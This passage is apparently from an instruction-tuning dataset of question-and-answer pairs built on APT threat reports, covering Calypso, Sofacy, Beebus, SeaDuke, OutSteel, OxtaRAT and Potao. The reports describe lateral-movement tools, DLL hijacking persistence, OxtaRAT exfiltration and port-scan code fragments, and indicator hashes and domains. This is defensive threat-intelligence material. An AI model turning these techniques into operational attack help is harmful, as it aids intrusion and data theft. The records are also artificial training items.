pseudorandom number generator (PRNG). The algorithm performs arithmetic (addition and subtraction) between the generated data and the data that needs to be encrypted or decrypted.\nNow decrypted, the payload is saved to disk at %ALLUSERSPROFILE;\\TMP_%d%d, where the last two numbers are replaced by random numbers returned by the rand() function. Depending on the configuration, the CAB archive contains one of three possibilities: a DLL and encrypted shellcode, a DLL with encoded loader in the resources, or an EXE file. We were unable to detect any instances of the last variant.\nBig Headline: Installation BAT script\nThe BAT script is encoded by substitution from a preset dictionary of characters; this dictionary is initialized in a variable in the installation script.\nIn the decoded script, we can see comments hinting at the main functions of the script:\n\u2022 REM Goto temp directory & extract file (go to TEMP directory and extract files there)\n\u2022 REM Uninstall old version (uninstall the old version)\n\u2022 REM Copy file (copy file)\n\u2022 REM Run pre-install script (run the installation BAT script)\n\u2022 REM Create service (create a service launching the malware at system startup)\n\u2022 REM Create Registry Run (create value in the registry branch for autostart)\nAt the beginning of each script we can see a set of variables. The script uses these variables to save files, modify services, and modify registry keys.\nIn one of the oldest samples, compiled in 2016, we found a script containing comments for how to configure each variable.\nBig Headline: Shellcode x86: stager\nIn most of the analyzed samples, the dropper was configured to execute shellcode. The dropper saved the DLL and encrypted shellcode to disk. The shellcode name was always identical to that of the DLL, but had the extension .dll.crt. The shellcode is encrypted with the same algorithm as the payload in the dropper. The shellcode acts as a stager providing the interface for communicating with C2 and for downloading modules. It can communicate with C2 via TCP and SSL. SSL is implemented via the mbed_tls library.\nInitial analysis of the shellcode revealed that, in addition to dynamically searching for API functions, it runs one more operation that repeats the process of PE file address relocation. The structure of the relocation table is also identical to that found in the PE file.\nSince the process of shellcode address relocation repeats that of the PE file, we can assume that initially the malware is compiled into a PE file, and then the builder turns it into shellcode. Debugging information found inside the shellcode supports that assumption.\nAPI functions are searched for dynamically and addresses are relocated, after which the configuration hard-coded inside the shellcode is parsed. The configuration contains information about the C2 server address, protocol used, and connection type.\nNext the shellcode creates a connection to C2. A random packet header is created and sent to C2. In response the malware receives a network key, saves it, and then uses it every time when communicating with C2. Then the information about the infected computer is collected and sent to C2.\nNext three threads are launched. One is a heartbeat sending an empty packet to C2 every 54 seconds. The other processes and executes commands from C2. As for the third thread, we could not figure out its purpose, because the lines implementing its functionality were removed from the code. All we can tell is that this thread was supposed to \"wake up\" every 54 seconds, just like the first one.\nBig Headline: Modules\nWe have not found any modules so far. But we can understand their functionality by analyzing the code responsible for communication between the shellcode and the modules. Each module is shellcode which is given control over the zero offset of the address. Each module exists in its own separate container. The container is a process with loaded module inside. By default, the process is svchost.exe. When a container is created, it is injected with a small shellcode that causes endless sleep. This is also hard-coded in the main shellcode, and more specifically in JustWait. pdb, most likely.\nThe module is placed inside with an ordinary writeprocess and is launched either with NtCreateThreadEx or, on pre-Vista operating systems, CreateRemoteThread.\nTwo pipes are created for each module. One is for transmitting the data from the module to C2; the other for receiving data from C2. Quite likely the modules do not have their own network code and instead use the pipes to communicate with external C2 through the main shellcode.\nEach module has a unique ID assigned by C2. Containers are launched in different ways. A container can be launched in a specific session open in the OS or in the same session as the stager. In any particular session, the container is launched by getting the handle for the session token of a logged-in user, and then launching the process as that user.\nQuestion: What tools and techniques did the Calypso APT group employ for lateral movement within the compromised network? How did they attempt to remain undetected?",
    "output": "Answer: The Calypso APT group employed several publicly available utilities and exploits for lateral movement, including SysInternals, Nbtscan, Mimikatz, ZXPortMap, TCP Port Scanner, Netcat, QuarksPwDump, WmiExec, EarthWorm, OS_Check_445, DoublePulsar, EternalBlue, and EternalRomance. They spread within the network by exploiting vulnerability MS17-010 or using stolen credentials. In one instance, they used DCSync and Mimikatz to obtain the Kerberos ticket of the domain administrator to infect more computers. The use of legitimate network administration tools allowed the attackers to stay undetected longer.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Background\nOur analysts follow the activities of a number of threat groups with a wide range of motivations. In this bulletin we are sharing intelligence relating to a recent phishing campaign conducted by a group widely referred to as 'Sofacy', named after the antivirus1 detection name for one of the malware families used by the group.\nOver the years there have been a number of papers discussing variations to the malware used by the group, but little discussion of less sophisticated techniques employed by the same attackers.\n\nQuestion: Why might cybersecurity experts need to focus on less sophisticated techniques employed by the Sofacy group, despite the extensive documentation on their malware variants?\n\nAnswer:",
    "output": "Cybersecurity experts need to focus on less sophisticated techniques employed by the Sofacy group because while there has been substantial research and documentation on the various malware families used by the group, there has been relatively little discussion on these simpler methods. Understanding these less sophisticated techniques is crucial for developing a comprehensive defense strategy, as attackers often use a combination of advanced and basic tactics to achieve their goals. By being aware of both types of threats, security professionals can better protect against the full spectrum of potential attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: In Operation Beebus, how does the malware achieve persistence on a compromised Windows system? Explain the mechanism and the specific vulnerability it exploits.",
    "output": "The malware achieves persistence by exploiting a well-documented vulnerability in the Windows OS known as DLL search order hijacking. This vulnerability allows the malware to take advantage of the order in which executables load DLLs. Specifically, the malware drops a DLL called ntshrui.DLL in the C:\\\\Windows directory. Since the first place from where the executable looks to load the DLL is its own directory, placing the ntshrui.DLL in the C:\\\\Windows directory ensures that the malicious DLL is loaded instead of the legitimate one, thereby achieving persistence.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: SeaDuke/ SeaDaddy/ SeaDask\nSeaDuke appeared in October 2014, after the disclosure of most of the Duke campaigns. Like the majority of the Duke family, SeaDuke exclusively targets government organizations. The main difference between Seaduke and its sister campaigns is that SeaDuke focuses on a small number of high-value targets. Additionally, of the Duke malware, SeaDuke alone is\nprogrammed in python. This developers' choice could indicate that the group is expanding their victim pool to Linux systems as well as Windows hosts. The overall framework of the malware remains similar to CozyDuke.\nSeaDuke is a highly configurable trojan and backdoor that is often installed onto victim systems through CozyDuke or via a compromised website. It has hundreds of possible configurations. According to Symantec, the threat actor behind CozyDuke may only deploy SeaDuke in systems belonging to \"major government-level targets.\" SeaDuke primarily allows the attacker to upload, to download, and to delete files on the victim machine as well as to retrieve bot/ system information and to update the bot configuration. It is possible that the threat actor deploys the malware to remove the indicators of compromise from other campaigns after a successful breach. The trojan may also be used to conduct pass the ticket attacks on Kerberos systems, to steal emails from Microsoft Exchange servers using compromised credentials, to archive sensitive data, or to exfiltrate data through legitimate cloud services. The C&C infrastructure behind SeaDuke relies on over 200 compromised web servers and several layers of RC4 and AES encryption and Base 64 encoding techniques. These extra obfuscation measures may be an attempt to remain undiscovered and thereby remove the attention on the Duke campaigns. SeaDuke communicates with its C&C servers via HTTP(s).\nAnswer this question: Why might the developers of SeaDuke have chosen to program the malware in Python, and how does this choice potentially expand their target pool?",
    "output": "The developers of SeaDuke chose to program the malware in Python, which is a departure from the typical programming languages used in the Duke family of malware. This choice could indicate that the group is expanding their victim pool to include Linux systems in addition to Windows hosts. Python is a versatile language that runs on multiple operating systems, making it easier for the malware to be deployed across different environments. By targeting both Windows and Linux systems, SeaDuke can potentially compromise a wider range of high-value targets, increasing the effectiveness of their campaigns.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Conclusion\nUnit 42 research discovered a threat group targeting an energy organization that is part of Ukraine's critical infrastructure. This attack is part of a year-long campaign of attacks that not only targeted Ukrainian government organizations, but also foreign nations' embassies in Ukraine. The threat group delivered a malicious payload called OutSteel that is capable of automatically exfiltrating various types of files, including documents, archives, database files and files containing email-related data. Based on the list of targeted organizations and the use of a file exfiltration tool, we believe this threat group's primary goal is to steal sensitive information for the purpose of situational awareness and leverage in dealing with Ukraine.\nFor Palo Alto Networks customers, our products and services provide the following coverage associated with this campaign:\nprotects endpoints from the SaintBot malware described in this blog.\ncloud-based threat analysis service accurately identifies the malware described in this blog as malicious.\nUsers of the  contextual threat intelligence service can view malware associated with these attacks using the ,  and  tags.\nPalo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about the (<https://www.cyberthreatalliance.org/>)Cyber Threat Alliance.\nBig Headline: Payload Hashes\n005d2d373e7ba5ee42010870b9f9bf829213a42b2dd3c4f3f4405c8b904641f2 0222f6bdfd21c41650bcb056f618ee9e4724e722b3abcd8731b92a99167c6f8d 0c644fedcb4298b705d24f2dee45dda0ae5dd6322d1607e342bcf1d42b59436c 0e1e2f87699a24d1d7b0d984c3622971028a0cafaf665c791c70215f76c7c8fe 0f7a8611deea696b2b36e44ea652c8979e296b623e841796a4ea4b6916b39e7c 0fc7154ebd80ea5d81d82e3a4920cb2699a8dd7c31100ca8ec0693a7bd4af8b7 137fc4df5f5cad2c88460314e13878264cc90d25f26b105bb057f6bfdca4cbf2 17c3cf5742d2a0995afb4dd2a2d711abe5de346abde49cf4cf5b82c14e0a155f 187e0a02620b7775c2a8f88d5b27e80b5d419ad156afc50ef217a95547d0feaa 18f24841651461bd84a5eac08be9bce9eab54b133b0e837d5298dac44e199d5f 1a1fe7b6455153152037668d47c7c42a068b334b91949739ed93256d5e3fbd89 1e6596320a3fa48d8c13609a66e639b35fb1e9caae378552956aa9659809162b 2762cbc81056348f2816de01e93d43398ba65354252c97928a56031e32ec776f 27868ae50b849506121c36b00d92afe3115ce2f041cc28476db8dfc0cc1d6908 2bef4a398a88749828afac59b773ae8b31c8e4e5b499aad516dd39ada1a11eca 2d9d61ce6c01329808db1ca466c1c5fbf405e4e869ed04c59f0e45d7ad12f25b 3075a467e89643d1f37e9413a2b38328fbec4dd1717ae57128fdf1da2fe39819 320d091b3f8de8688ce3b45cdda64a451ea6c22da1fcea60fe31101eb6f0f6c2 37be3d8810959e63d5b6535164e51f16ccea9ca11d7dab7c1dfaa335affe6e3d 39e8455d21447e32141dc064eb7504c6925f823bf6d9c8ce004d44cb8facc80b 3d7a05e7ba9b3dd84017acab9aab59b459db6c50e9224ec1827cbf0a2aee47db 3f7b0d15f4cbe63e57fb06b57575bf6dd9eb777c737b0886250166768169fc6c 4715a5009de403edd2dd480cf5c78531ee937381f2e69e0fb265b2e9f81f15c4 494122ff204f3dedaa8f0027f9f98971b32c50acbcce4efa8de0498efa148365 4c8a433ed99cc4b6994b2e1df59eb171f326373ba100a3653eb37e8a8ee2e6f2 4d59a7739f15c17f144587762447d5abb81c01f16224a3f7ce5897d1b6f7ee77 4ee84419fb9267081480954f1be176095a45fe299078dfa95f980e513b46a020 4fdc37f59801976606849882095992efecee0931ece77d74015113123643796e 506c90747976c4cc3296a4a8b85f388ab97b6c1cfae11096f95977641b8f8b6f 56731c777896837782beff4432330486a941e4f3af44b4d24be7c62c16e96256 5fc108db5114be4174cb9365f86a17e25164a05cc1e90ef9ee29ab30abed3a13 619393d5caf08cf12e3e447e71b139a064978216122e40f769ac8838a7edfca4 61f5e96ec124fef0c11d8152ee7c6441da0ea954534ace3f5f5ec631dd4f1196 6a698edb366f25f156e4b481639903d816c5f5525668f65e2c097ef682afc269 6ee2fd3994acdbb9a1b1680ccd3ac4b7dcb077b30b44c8677252202a03dccf79 700b05fede8afe3573b6fec81452d4b09c29adb003cdacb762c8b53d84709901 707971879e65cbd70fd371ae76767d3a7bff028b56204ca64f27e93609c8c473\n71e9cc55f159f2cec96de4f15b3c94c2b076f97d5d8cecb60b8857e7a8113a35 7419f0798c70888e7197f69ed1091620b2c6fbefead086b5faf23badf0474044 750c447d6e3c7d74ccab736a0082ef437b1cd2000d761d3aff2b73227457b29c 75f728fa692347e096386acd19a5da9b02dca372b66918be7171c522d9c6b42d 7963f8606e4c0e7502a813969a04e1266e7cd20708bef19c338e8933c1b85eda 7b3d377ca2f6f9ea48265a80355fe6dc622a9b4b43855a9ddec7eb5e4666a1d4 7d7d9a9df8b8ffd0a0c652a3d41b9a5352efb19424e42942aaf26196c9698019 7e1355e51eb9c38e006368de1ae80b268ffab6918237696474f50802e3d8a9c8 7eb1dc1719f0918828cc8349ee56ca5e6bbde7cada3bc67a11d7ff7f420c7871 7ee8cfde9e4c718af6783ddd8341d63c4919851ba6418b599b2f3c2ac8d70a32 82d2779e90cbc9078aa70d7dc6957ff0d6d06c127701c820971c9c572ba3058e 89da9a4a5c26b7818e5660b33941b45c8838fa7cfa15685adfe83ff84463799a 8ab3879ed4b1601feb0de11637c9c4d1baeb5266f399d822f565299e5c1cd0c4 9528a97d8d73b0dbed2ac496991f0a2eecc5a857d22e994d227ae7c3bef7296f 975f9ce0769a079e99f06870122e9c4d394dfd51a6020818feeef9ccdb8b0614 9917c962b7e0a36592c4740d193adbd31bc1eae748d2b441e77817d648487cff 9a72e56ac0f1badd3ca761b53e9998a7e0525f2055dbec01d867f62bdb30418e 9cf4b83688dd5035623182d6a895c61e1e71ea02dc3e474111810f6641df1d69 9d7c3463d4a4f4390313c214c7a79042b4525ae639e151b5ec8a560b0dd5bd0a 9ec80626504ca869f5e731aef720e446936333aaf6ab32bae03c0de3c2299f34 9ee1a587acaddb45481aebd5778a6c293fe94f70fe89b4961098eb7ba32624a8 9ef2d114c329c169e7b62f89a02d3f7395cb487fcd6cff4e7cac1eb198407ba6 9fbeb629ea0dc72ac8db680855984d51b28c1195e48abff2e68b0228f49d5b0f a61725f3b57fd45487688ad06f152d0db139a6cb29f3515ea90ffe15cb7e9a7a a9a89bb76c6f06277b729bc2de5e1aaef05fc0d9675edbc0895c7591c35f17eb afdc010fc134b0b4a8b8788d084c6b0cff9ea255d84032571e038f1a29b56d0a b02c420e6f8a977cd254cd69281a7e8ce8026bda3fc594e1fc550c3b5e41565d b0b0cb50456a989114468733428ca9ef8096b18bce256634811ddf81f2119274 b0b4550ba09080e02c8a15cec8b5aeaa9fbb193cec1d92c793bdede78a70cec6 b1af67bcfaa99c369960580f86e7c1a42fc473dd85a0a4d3b1c989a6bc138a42 b2f5edef0e599005e205443b20f6ffd9804681b260eec52fa2f7533622f46a6c b6e34665dd0d045c2c79bf3148f34da0b877514a6b083b7c8c7e2577362463b3 b72188ba545ad865eb34954afbbdf2c9e8ebc465a87c5122cebb711f41005939 b83c41763b5e861e15614d3d6ab8573c7948bf176143ee4142516e9b8bcb4423 b8ce958f56087c6cd55fa2131a1cd3256063e7c73adf36af313054b0f17b7b43 bd83e801b836906bab4854351b4d6000e0a435736524a504b9839b5f7bdf97cc c222122fe3e1206ba2363c17fb37ae2f8e271840e17b3bb9ba5359f2793f9574 c33a905e513005cee9071ed10933b8e6a11be2335755660e3f7b2adf554f704a c532d19652ea6d4e0ebb509766de1ec594dd80152f92f7ef6b80ad29d2aa8cf4 c6c47d3d7e56213f0d0ced379c64e166ed5a86308ea96856163a4e0155b1fc6e cb4a93864a19fc14c1e5221912f8e7f409b5b8d835f1b3acc3712b80e4a909f1 cb6c05b2e9d8e3c384b7eabacde32fc3ac2f9663c63b9908e876712582bf2293 cce564eb25a80549d746c180832d0b3d45dcd4419d9454470bfd7517868d0e10 cd93f6df63187e3ac31ea56339f9b859b0f4fbe3e73e1c07192cef4c9a6f8b08 d4d4aa7d621379645d28f3a16b3ba41b971216869f5448ea5c1fc2e78cfecb26 d6e2a79bc87d48819fabe332dd3539f572605bb6091d34ae7d25ae0934b606b5 db8975fd6c04a7d3790eb73ab8e95b6dbf6c9d65ad5c6a6d3c862d0284f87c34 df3b1ad5445d628c24c1308aa6cb476bd9a06f0095a2b285927964339866b2c3 dfc24fa837b6cd3210e7ea0802db3dcf7bb1f85bff2c1b4bda4c3c599821bf8c e0c46e23bd1b5b96123e0c64914484bbfae7a7ad13cbd45184035d4c0f8a10a2 e8207e8c31a8613112223d126d4f12e7a5f8caf4acaaf40834302ce49f37cc9c e9a858127f5f6e5e0e94ed655a2bf9ed228f87bc99d9b12113e27dcc84be3909 ebbf30e06de3a25f76cf43c72c521d14a27053e4d9be566b41f50c41bea3a7a9 ec3c0afccfef11f753a408c859d98bbba4841e87f7f1a48573270c0d82252b03 ec62c984941954f0eb4f3e8baee455410a9dc0deb222360d376e28981c53b1a0 ec8868287e3f0f851ff7a2b0e7352055b591a2b2cb1c2a76c53885dee66562dc\nf24ee966ef2dd31204b900b5c7eb7e367bc18ff92a13422d800c25dbb1de1e99 f2bdde99f9f6db249f4f0cb1fb8208198ac5bf55976a94f6a1cebfb0d6c30551 f4a56c86e2903d509ede20609182fbe001b3a3ca05f8c23c597189935d4f71b8 f58c41d83c0f1c1e8c1c3bd99ab6deabb14a763b54a3c5f1e821210c0536c3ff fa1bc7d6f03a49af50f7153814a078a32f24f353c9cb2b8e3f329888f2b37a6e fad2e8293cf38eec695b1b5c012e187999bd94fbcad91d8f110605a9709c31b3 ff07325f5454c46e883fefc7106829f75c27e3aaf312eb3ab50525faba51c23c ffad5217eb782aced4ab2c746b49891b496e1b90331ca24186f8349a5fa71a28\n\nBased on the provided section, what are the primary goals of the threat group behind the attack on the energy organization in Ukraine? Explain how the use of the OutSteel payload aligns with these goals.",
    "output": "The primary goals of the threat group behind the attack on the energy organization in Ukraine are to steal sensitive information for the purpose of situational awareness and leverage in dealing with Ukraine. The use of the OutSteel payload aligns with these goals because it is capable of automatically exfiltrating various types of files, including documents, archives, database files, and files containing email-related data. By exfiltrating these files, the threat group can gain valuable insights into the operations and communications of the targeted organization, enhancing their situational awareness and providing leverage in negotiations or strategic planning.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Infection chain\nThe first change that the actors implemented in their latest attack is in the infection chain. Previously, the initial .SCR files, masquerading as Word or PDF documents, served only as downloaders. They sent a request to WordPress-like URLs on the C&C server ( wp-feed.php , wp-comment.php , etc) and then executed the main malware received from the attackers' server. In the latest campaign, the .SCR file already contains the OxtaRAT backdoor, as a polyglot file. This saves the actors from needing to make additional requests for binaries to the C&C server and attracting unnecessary attention, as well as hides the main malware from being easily discovered on the infected machine, as it looks like a regular image and bypasses type-specific protections.\nMedium Headline: Data collection and exfiltration\nSince the previous publicly disclosed version, OxtaRAT was updated with 10 additional commands introducing new functionality. Most of the new features aim to improve the ways to steal the victim's data. For example, they implemented the listdir command to recursively enumerate the files in a specified folder, collecting additional data such as the last modified date and size. The previously existing command massdownload , which is used to exfiltrate files of predefined types, was also updated with a few new file extensions (marked in bold):\nAs can be seen from this snippet, the actors are now interested in additional file types related to Oracle and Microsoft Access databases. This is an interesting development, as it indicates they may be broadening their targets to include corporate networks or specific individuals, as common private computers rarely contain personal files in DB formats.\nThe actors also implemented \"advanced\" mass-download commands such as the massdownload2 and massdownload2list that allow the actors to enumerate and exfiltrate specified filetypes more conveniently. In addition, they implemented functions to work with RAR archives ( installrar , rarit , unrarit ) which, along with the clear benefits of uploading the auxiliary tools inside RAR archives to the infected machines, enable the actors to archive all the files of their interest to the multi-volume RAR archive. The default list of extensions provided in the code of the rarit exfiltration function shows a focus on documents, pictures, archives, and databases:\nFunc rar_it($source_file_or_dir, $destination_path, $extensions_to_rar =\n\"*.xls;*.xlsx;*.doc;*.docx;*.pdf;*.rar;*.zip;*.tar;*.tar.gz;*.sql;*.txt;*.mdb;*.jpg;*.jpeg;*.accdb\", $parts = \"12M\")\nAnother interesting feature included in the most recent version is the speedtest command which invokes Speedtest CLI, a dedicated tool to test the speed and performance of an internet connection. As the malware is not only capable of collecting a large quantity of files but also recording video from a web camera and screen, it can produce significantly large outputs with gigabytes of data. Therefore, for the sake of\nOPSEC, to hide the extensive data exfiltration the actors likely needed a way to control and estimate the upload all of the collected information to their servers.\nThe last feature added to the data collection mechanism is a proclist command, which uses WMIC to retrieve the command line for each of the processes. This feature might be used for evasion purposes, so the actors can make sure they are running in an actual environment as opposed to a sandbox, as well as to learn more about the software configurations running on the victim's machine.\nMedium Headline: Port Scanning\nOne of the unexpected features that we found during this investigation is the portscan tool, which is included only in the newer version of the backdoor. The port scanner, pscclient.exe , is an Auto-IT based non-obfuscated TCP Connect tool that can scan a specified range of IP addresses and a range of ports. The default range of ports configured in the tool includes both well-known and non-standard ports:\nGlobal $port_range[100] = [135, 4444, 136, 137, 138, 139, 20, 21, 22, 23, 80, 443, 445, 8443, 8080, 3131, 3128, 5681, 5060, 5061, 3389, 33899, 33399, 3390, 389, 4000, 1433, 1521, 9222, 45687, 7292, 789, 50022, 2109, 2233, 55522, 33391, 33392, 33390, 33394, 33389, 33398]\nOxtaRAT, which previously had mostly local recon and surveillance capabilities, can now be used as a pivot for active reconnaissance of other devices. This may indicate that the threat actors are preparing to extend their main attack vector, which is currently social engineering, to infrastructure-based attacks. It also might be a sign that the actors are moving from targeting individuals to targeting more complex or corporate environments.\nBig Headline: Infrastructure\nOur search for domains with similar characteristics to edupoliceam[.]info led to more active domains: filesindrive[.]info , mediacloud[.]space and avvpassport[.]info . All the domains are registered with NameCheap. While filesindrive[.]info and mediacloud[.]space , similar to filecloudservices[.]xyz used in back in 2021, have a generic reference to cloud file storages, the domain avvpassport[.]info is more specific, and it masquerades as the Passport and Visa Office of the Republic of Armenia. Both of these domains, edupoliceam[.]info and avvpassport[.]info , were created on September 23, 2022, and were likely also used for other attacks on Armenian targets.\nAt the beginning of our investigation, all of these domains used Cloudflare services to hide their IP addresses. Due to their configuration, by looking for IP addresses with the same behavior, we identified 38.242.197[.]156 as likely their real IP address. While we were completing the investigation and notifying the relevant parties, Cloudflare blocked these domains as malicious, and they all started to publicly resolve to their real IP address 38.242.197[.]156 .\nBig Headline: Targeting and Attribution\nAlexander Lapshin, whose name is used in the lure,  that on the same day the samples were uploaded to VT, the representatives of Artsakh bank notified that they received malicious emails in his name. This information was also later confirmed by (<https://cyberhub.am/en/>)Cyberhub-AM, digital security helpdesk for Armenian civil society. Due to the infrastructure revealed, we believe that there might have been other targets of this campaign in Armenia as well.\nAll of the samples from this campaign and earlier ones are related to Azerbaijani government interests; they either targeted Azerbaijani political and human rights activists or, if the targets were not disclosed publicly, reference tensions between Azerbaijan and Armenia over Artsakh/Nagorno-Karabakh. Meta, in their (<https://about.fb.com/wp-content/uploads/2022/04/Meta-Quarterly-Adversarial-Threat-Report_Q1-2022.pdf>)Adversarial Threat Report Q1-2021, attributed the previous campaigns reported by Qurium to the Azeri Ministry of Internal Affairs. However, no technical analyses were provided.\nIn 2017, Amnesty International (<https://web.archive.org/web/20190416193823/https:/www.amnesty.org/en/latest/research/2017/03/False-Friends-Spearphishing-of-Dissidents-in-Azerbaijan/>)reported a campaign that started as early as November 2015 and continued through 2017. This campaign used Autoit malware called AutoItSpy against Azerbaijani dissidents, and was later by Qurium to other \"denial-of-service attacks, intrusion attempts, spear-phishing campaigns and electronic media monitoring from Internet infrastructure associated with the Government of Azerbaijan.\" The AutoItSpy malware used at the time had the ability to log the keystrokes and collect screenshots, exfiltrating both of them over SMTP protocol.\nEven though we couldn't find any infrastructure overlap with our campaign (considering a gap of a few years and public exposure of previous attacks), there is a significant overlap in major TTPs:\nThe use of AutoIT malware.\nThe use of files with SCR extensions bearing document-related icons (PDF, Word).\nA focus on surveillance technology (keylogging, screen capture, data exfiltration).\nSimilar consistent targeting.\nAlthough it is tricky to compare the code of tools with different functionality (keylogger compared to a full-blown surveillance tool), there are a few high-level overlaps in the coding style of these tools:\nThe samples from the AutoItSpy campaign are obfuscated with similar techniques as the OxtaRAT samples from 2022.\nTemporary file names with collected information of AutoItSpy and OxtraRAT both mimic the Windows thumbnail cache:\nAdditional details such as extensively using %random% %random% %random% in all the batch scripts, immediately setting file attributes with FileSetAttrib($dir, \"+SH\") for all the newly created folders, excessive usage of the Random function, etc.\nBased on these similarities in TTPs, code and targeting, we can conclude with medium confidence that both cases involve the same threat actors. We can also speculate that the missing \"implant\" in OxtaRAT that we were unable to access might be a keylogger; not only is it an important functionality missing from OxtaRAT's multi-functional surveillance arsenal, but also the actors might take extra measures to avoid revealing it to anyone except the targets, possibly to avoid attribution based on already uncovered information.\nRead the text above and answer this question: What is the significance of the port scanning feature included in the newer version of OxtaRAT? How does this feature expand the malware's capabilities beyond its previous versions?",
    "output": "The port scanning feature included in the newer version of OxtaRAT is significant because it allows the malware to scan a specified range of IP addresses and ports, including both well-known and non-standard ports. This feature expands the malware's capabilities beyond its previous versions, which primarily focused on local recon and surveillance. By incorporating port scanning, OxtaRAT can now be used as a pivot for active reconnaissance of other devices, indicating that the threat actors may be preparing to extend their main attack vector from social engineering to infrastructure-based attacks and targeting more complex or corporate environments.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: Postal-service campaigns\nIn March 2014, the gang behind Potao started using a new infection vector. They created a malicious landing webpage called MNTExpress. The website was apparently inspired by the site of the legitimate Russian postal service Pony Express.\n6) The text strings shown in the screenshot are not present in regular release versions of the trojan.\nPosing as a parcel tracking receipt or an invoice is a very common technique for spreading malware. Instructions to download the malicious bait are usually sent in waves of phishing emails. The Potao gang, however, used a different approach.\nThe targets of their interest were sent an SMS message that contained a link to the fraudulent landing webpage, along with a specific tracking code and the recipient's name. This approach indicates very specific targeting of the attacks, since:\n\u2022 The attackers had prior knowledge of the victims' full names and their cellphone numbers.\n\u2022 The delivered binaries were tailored to the victim. In order to download a sample of Win32/Potao, it was necessary to enter a specific tracking code into the web form.\nFigure 14 shows a recipient inquiring about the SMS on a Vkontakte discussion forum:\nThe same infection scenario was used approximately one year later, in March 2015. This time, the attackers registered the domain WorldAirPost.com and the website design was stolen from Singapore Post. Curiously, the attackers changed the Singapore Post logo to \"Italy Post\":\nAt the time of writing the attackers are still active, having registered WorldAirPost.net in June 2015. It is also interesting to note that while the MNTExpress websites contained both Russian and English language mutations, WorldAirPost was only in English.\nInterestingly, the Potao droppers served in these campaigns were not disguised as Word documents but Excel spreadsheets. Also, instead of popping up a decoy document, a fake \"excuse\" dialog box is shown (Figure 17):\nSmall Headline: Attacks against Ukrainian government and military\nSince March 2015, ESET has detected Potao binaries at several high-value Ukrainian targets that include government and military entities and one of the major Ukrainian news agencies. The infection vector used in these attack waves was again an executable with a MS Word document icon and this time cleverly chosen filenames to increase the likelihood that the recipient would open the bait:\nThe topics in the file names correspond to the fact that government and military officials were targeted. The decoy documents displayed once again appeared corrupted.\n7) The acronym 'ATO' refers to 'Anti Terrorist Operation' in Eastern Ukraine. The same theme was used to spread the BlackEnergy trojan.\nMedium Headline: TrueCrypt Russia\nDuring our monitoring of the Potao botnet, we discovered infections that originated from a rather suspiciously-named trojan dropper and an even more suspicious website.\nWe found out that instances of Win32/Potao were being launched by a dropper named TrueCrypt.exe. That wouldn't be too surprising, since malware operators often use file names that resemble legitimate applications, but in this case the dropper was a binary of the actual, now discontinued, TrueCrypt encryption software. Investigating further, we discovered that not only was the Potao malware installed by a trojanized version of TrueCrypt but it had also been downloaded from the website truecryptrussia ru, which offers downloads of the abovementioned TrueCrypt binaries. Finally, we discovered that the domain in question was also used as a malware C&C server, and thus truecryptrussia.ru being a fraudulent website operated by the attackers seems to be the likelier explanation than merely being a legitimate website compromised by them.\nTo sum it up, the website and software of \"TrueCrypt Russia\" was found guilty of:\n1. Hosting trojanized (backdoored) versions of the TrueCrypt encryption software. (See the Win32/FakeTC section for a technical analysis of the backdoor.)\n2. Hosting the Win32/Potao malware.\n3. Acting as a C&C server for abovementioned trojanized TrueCrypt.\nNote, however, that not every download of the TrueCrypt software from the Russian website is malicious or contains a backdoor. The malicious versions of the software are served only to selected visitors, based on unknown specific criteria. This lends additional evidence to the view that the operation is run by a professional gang that selectively targets their espionage victims.\nAccording to ESET's LiveGrid\u00ae telemetry, the Russian TrueCrypt website has been serving malware since at least June 2012. The served binaries' timestamps date the earliest trojans to April 2012.\nRead the text above and answer this question: What were the key differences between the MNTExpress and WorldAirPost campaigns conducted by the Potao gang, and how did the attackers adapt their tactics over time?",
    "output": "The MNTExpress campaign, initiated in March 2014, involved a malicious landing webpage inspired by the legitimate Russian postal service Pony Express. The attackers sent SMS messages with links to this page. Approximately one year later, in March 2015, the attackers registered the domain WorldAirPost.com and stole the website design from Singapore Post, changing the logo to 'Italy Post.' While the MNTExpress websites contained both Russian and English language mutations, WorldAirPost was only in English. Additionally, the Potao droppers in these campaigns were disguised as Excel spreadsheets instead of Word documents, and they showed a fake 'excuse' dialog box instead of a decoy document. These changes demonstrate the attackers' ability to adapt their tactics, including language localization and file types, to evade detection and increase the effectiveness of their campaigns.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Introduction\nAs 2012 Matasano summer interns, we were tasked with running a research project with a couple criteria:\n\u2022 It should be something we are both interested in.\n\u2022 We should be able to present our research for the company at the end of our internship. However, on completion, we decided that it would be best if we made our findings public.\nWith John Villamil, our advisor, we decided that given our interest in low-level analysis, we should analyze Remote Administration Tools (RATs). RATs have  recent seen media attention RATs due to their use by oppressive governments in spying on activists and other \"dissidents\". We felt this to be a perfect project.\nRemote Administration Tools are pieces of software which, once installed on a victim's computer allow a remote user to control and access the system. RATs can be used legitimately by system administrators, or they can be used maliciously.\nThere are a variety of methods by which they are installed on a computer: Various social engineering tactics can be employed to get a user to open the executable, they can be bundled with other pieces of software, they can be installed as the payload of a virus or worm, or they can be installed after an attacker gains access to a system through an exploit. Most of the commonly available RATs are at least able to perform keylogging, screen and camera capture, file management, code and script execution, power control, registry management, and password sniffing. Wikipedia has a more complete list of common RAT functionality [1].\nOur research focused on analyzing several publicly available RATs: DarkComet, Bandook, CyberGate and Xtreme RAT. Interestingly, all of the RATs we analyzed were coded either in part or entirely in Delphi. They all featured a reverse connecting architecture, as well as some form of cryptography or obfuscation of their communications. In this paper, we present our analysis of their protocols, explain how to decrypt their traffic, as well as present vulnerabilities we have found. The appendices to this paper contain MITM tools for decrypting traffic, as well as proof of concept exploits for the vulnerabilities we've found.\nAnswer this question: In the context of the APT report 'PEST-CONTROL', why did the researchers choose to focus on analyzing Remote Administration Tools (RATs), and what specific features and functionalities of these 